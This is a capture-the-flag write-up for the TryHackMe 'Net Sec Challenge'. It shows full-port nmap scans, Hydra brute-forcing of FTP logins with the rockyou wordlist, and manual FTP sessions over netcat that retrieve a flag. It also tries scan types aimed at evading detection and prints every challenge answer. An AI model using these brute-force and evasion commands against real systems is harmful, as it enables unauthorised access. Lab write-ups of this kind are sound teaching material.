* [TryHackMe: Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)

This CTF is just a series of questions. All should be solvable using nmap, telnet, and Hydra... Though I'm going to substitute netcat for telnet. However, I'm sticking to the spirit of things, and will only use those three tools.

The target machine is 10.10.152.115.

We'll start off with a full nmap scan:

```bash
sudo nmap -v -oN net-sec-challenge -Pn -A --reason -T4 \
          -p- 10.10.152.115
```

Results:

This enables us to answer a set of questions immediately.

* What is the highest port number being open less than 10,000? - `8080`
* There is an open port outside the common 1000 ports; it is above 10,000. What is it? - `10021`
* How many TCP ports are open? - `6`
* What is the flag hidden in the HTTP server header? - `THM{web_server_25352}`
* What is the flag hidden in the SSH server header? - `THM{946219583339}`
* We have an FTP server listening on a nonstandard port. What is the version of the FTP server? - `vsftpd 3.0.3`

That's all pretty easy. The next one is a bit harder with our limited toolset...

We start off by attempting to brute force the password for `eddie` or `quinn` using Hydra. To do this, we're going to run two Hydra tasks in parallel.

```bash
# Hydra task to break eddie's password.
#
hydra -v -f -t 10 -s 10021 -l eddie \
      -P ~/.local/share/red-team/wordlists/rockyou.txt \
         10.10.152.115 ftp

# Hydra task to break quinn's password.
#
hydra -v -f -t 10 -s 10021 -l quinn \
      -P ~/.local/share/red-team/wordlists/rockyou.txt \
         10.10.152.115 ftp
```

These quickly return the results `eddie:jordan` and `quinn:andrea`. Let's try to use `nc -nv 10.10.152.115 10021` to log into `eddie`'s account.

```ftp
(UNKNOWN) [10.10.152.115] 10021 (?) open
220 (vsFTPd 3.0.3)
USER eddie
331 Please specify the password.
PASS jordan
230 Login successful.
425 Use PORT or PASV first.
PASV
227 Entering Passive Mode (10,10,152,115,119,101).
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
```

The trick here is that the passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 - o4 are the four octets of the server's IP address (10.10.152.115), and p1 - p2 are the high + low bytes of the port number to connect to, (256 Ã— p1) + p2. Thus, after entering passive mode we can catch the reply using a second netcat instance, `nc -nv 10.10.152.115 30565`. We start this *before* entering the LIST command, revealing that `eddie` has access to no files.

Let's have the same conversation for `quinn`.

```ftp
(UNKNOWN) [10.10.152.115] 10021 (?) open
220 (vsFTPd 3.0.3)
USER quinn
331 Please specify the password.
PASS andrea
230 Login successful.
PASV
227 Entering Passive Mode (10,10,152,115,120,34).
LIST
150 Here comes the directory listing.
226 Directory send OK.
PASV
227 Entering Passive Mode (10,10,152,115,117,85).
RETR ftp_flag.txt
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
QUIT
221 Goodbye.
```

This time we need to open *two* auxiliary netcat sessions. The first, `nc -nv 10.10.152.115 30754`, catches the LIST command, which reveals that `quinn` has access to an `ftp_flag.txt` file. The second, `nc -nv 10.10.152.115 30037`, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.

* We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP? - `THM{321452667098}`

For the final challenge, we go to `http://10.10.152.115:8080`. The challenge is to scan 10.10.152.115 "as covertly as possible". I'm not really willing to wait 7 months for a scan, but I'll bet that all we need to do is use `-T1` and drop `-A`.

```bash
sudo nmap -v -Pn -n -T1 -p- 10.10.152.115
```

Well, that didn't work - "71% chance of scan being detected" and we're nowhere near done. That, and the machine expired without me even noticing.

New target IP is 10.10.34.244.

Maybe speed doesn't matter here? Let's try a scan that shouldn't even look like a connection - an ACK scan - but at a more "normal" rate.

```bash
sudo nmap -v -Pn -n -T4 -sA -p- 10.10.34.244
```

Well, that resulted in an almost immediate flag. Switching to `-T2` for the timing here also incremented things quite quickly.

What about a null scan? That might actually get me more information than an ACK scan, but should elicit *any* response from open ports.

```bash
sudo nmap -v -Pn -n -T4 -sN -p- 10.10.34.244
```

"Null scan" is apparently the right answer, as the challenge provided the flag almost immediately (which doesn't *actually* make any sense, but whatever...).

* Browsing to `http://10.10.152.115:8080` displays a small challenge that will give you a flag once you solve it. What is the flag? - `THM{f7443f99}`
